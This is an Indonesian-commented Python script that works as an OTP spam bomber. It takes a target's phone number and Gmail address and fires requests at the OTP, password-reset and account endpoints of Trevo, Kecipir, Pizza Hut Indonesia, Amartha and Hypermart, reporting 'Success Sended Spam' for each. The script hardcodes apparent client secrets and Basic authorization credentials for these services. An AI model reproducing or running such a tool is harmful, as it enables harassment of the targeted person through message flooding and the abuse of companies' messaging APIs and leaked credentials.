import sys          #untuk fungsi pada terminal, seperti autoclick() dan exit()
import subprocess   #installing python module within code / script (tanpa requirements.txt)

try: #import Module
    import requests #POST, GET, & PUT URL API
    import time     #Untuk Informasi Waktu
    import random   #Untuk Random User
    import os       #Untuk "clear" pada terminal
    import urllib3  #Untuk HTTP Client pada python
    import json     #Agar body Request dapat dilihat dengan cara di print
    import base64   #Untuk variasi output
    import emot     #Untuk menambahkan emot
    import shutil
finally:
    import requests
    import urllib3
    from colorama import Fore,Back,init
    from requests import get,post
    from urllib import request
    from bs4 import BeautifulSoup as bs

from urllib3.exceptions import *
from bs4 import BeautifulSoup as bs
from pip._vendor.requests import post,get # Bisa langsung "from requests import post,get"

# Inisialisasi Variasi Warna Output Terminal.
hijau="\033[1;92m "
putih="\033[1;97m"
abu="\033[1;90m"
kuning="\033[1;93m"
ungu="\033[1;95m"
merah="\033[1;91m"
biru="\033[1;96m"

B = Fore.BLUE
W = Fore.WHITE
R = Fore.RED
G = Fore.GREEN
BL = Fore.BLACK
Y = Fore.YELLOW

nomor = input(f"{W}[{R}• {kuning}•{hijau}•{W}] {biru}Nomor Target exp +6287805746541{W}: ")
if "+62" in nomor:
    email = input(f"{W}[{R}• {kuning}•{hijau}•{W}] {biru}Email Target {W}: ")
    if "@gmail.com" in email:
        validasi = nomor.replace("+62","0")
        trevo = requests.post("https://api-v2.trevo.my/common-users/otp/whatsapp",headers={"Host":"api-v2.trevo.my","Accept":"application/json","Cache-Control":"no-cache","X-App-Version":"3.5.3","X-App":"trevo","X-Country-Code":"ID","X-Platform":"android","X-Appsflyer-Id":"1681353044329-5958541001121242825","Content-Type":"application/json","Content-Length":"133","Accept-Encoding":"gzip, deflate","User-Agent":"okhttp/3.12.12","Connection":"close"},data=json.dumps({"clientId":"trevo","clientSecret":"gukEsPewA7aSWiboP0edr2FIb0ePhizisAwRofr4SicaFriB","language":"id","phoneNumber":""+nomor})).text
        kecipir = requests.post("https://api.kecipir.com/user/account/profile/forgot",headers={'Host':'api.kecipir.com','Authorization':'Basic bWF4aW11ejprM2MxcDFyYWRyVzIkMjQxOQ==','Cache-Control':'public, max-age=5','Content-Type':'application/x-www-form-urlencoded','Content-Length':'75','Accept-Encoding':'gzip, deflate','User-Agent':'okhttp/5.0.0-alpha.11'},data={"device":"b038edd6b131cd1f", "email":email ,"token":"noauth.android"}).text
        respon_kecipir = json.loads(kecipir)
        if(respon_kecipir['code'] == 200):
            print (f"{W}[{G}✓{W}][{G}{respon_kecipir['code']}{W}][{G}Email{G}{W}] Kecipir Success Sended Spam")
        else:
            print (f"{W}[{R}x{W}][{R}{respon_kecipir['code']}{W}][{G}Email{G}{W}] Kecipir {respon_kecipir['message']}")

        pos = requests.get("https://api-prod.pizzahut.co.id/customer/v1/customer/email/"+email, headers={"Host":"api-prod.pizzahut.co.id","Content-Com.ph.id.consumer.model.type":"application/json","X-Client-Id":"b39773b0-435b-4f41-80e9-163eef20e0ab","X-Platform":"ANDROID","X-Device-Type":"phone","X-Lang":"en","X-Channel":"2","User-Agent":"Pizza Hut Indonesia/3.2.9 Dalvik/2.1.0 (Linux; U; Android 7.1.2; ASUS_Z01QD Build/QKQ1.190825.002)","X-Device-Id":"b038edd6b131cd1f","Accept-Encoding":"gzip, deflate"}).text
        respon_pizzahut = json.loads(pos)
        if(respon_pizzahut['code'] == 200):
            print (f"{W}[{G}✓{W}][{G}{respon_pizzahut['code']}{W}][{G}Email{G}{W}] Pizzahut Success Sended Spam")
        else:
            print (f"{W}[{R}x{W}][{R}{respon_pizzahut['code']}{W}][{G}Email{G}{W}] Pizzahut {respon_pizzahut['message']}")

        Amartha = requests.post("https://api.amartha.net/v1/api/register/requestForgotToken",headers={'Host':'api.amartha.net','X-App-Version':'108','Content-Type':'application/json','Content-Length':'24','Accept-Encoding':'gzip, deflate','User-Agent':'okhttp/4.9.0'},data=json.dumps({"phone":""+validasi})).text
        respon_amartha = json.loads(Amartha)
        if(respon_amartha['stat_code'] == 200):
            print (f"{W}[{G}✓{W}][{G}200{W}][{G}SMS{G}{W}] Amartha Success Sended Spam")
        elif(respon_amartha['stat_code'] == 400):
            print (f"{W}[{R}x{W}][{R}{respon_amartha['stat_code']}{W}][{G}SMS{G}{W}] Amartha limit tunggu 8 menit")
        else:
            print (f"{W}[{R}x{W}][{R}Lapor Bug🐞!!{W}][{G}SMS{G}{W}] Amartha Bermasalah")

        hypermart = requests.post("https://hicardmore.hypermart.co.id/api/v1/public/otp/request",headers={"Host":"hicardmore.hypermart.co.id","Authorization":"","Content-Type":"application/json","Content-Length":"26","Accept-Encoding":"gzip, deflate","User-Agent":"okhttp/4.9.2","Connection":"close"},data=json.dumps({"phone":""+nomor})).text
        respon_hypermart  = json.loads(hypermart)
        if(respon_hypermart["statusCode"] == 200):
            print (f"{W}[{G}✓{W}][{G}200{W}][{G}SMS{G}{W}] Hypermart Success Sended Spam")
        elif(respon_hypermart["statusCode"] == 400):
            print (f"{W}[{R}x{W}][{R}{respon_hypermart['statusCode']}{W}][{G}SMS{G}{W}] Hypermart OTP Max Limit")
        else:
            print (f"{W}[{R}x{W}][{R}Lapor Bug🐞!!{W}][{G}SMS{G}{W}] Hypermart Bermasalah")

        print (f"{W}[{G}✓{W}][{G}200{W}][{G}WhatsApp{G}{W}] Trevo Success Sended Spam")
    else:
        print(f"{W}[{R}Oops!{W}][{R}Kesalahan Format{W}] Sistem hanya mengizinkan email dari gmail.com.")

else:
    print(f"{W}[{R}Oops!{W}][{R}Kesalahan Format{W}] Perhatikan Nomor bro!! format nomor awali dengan +62!")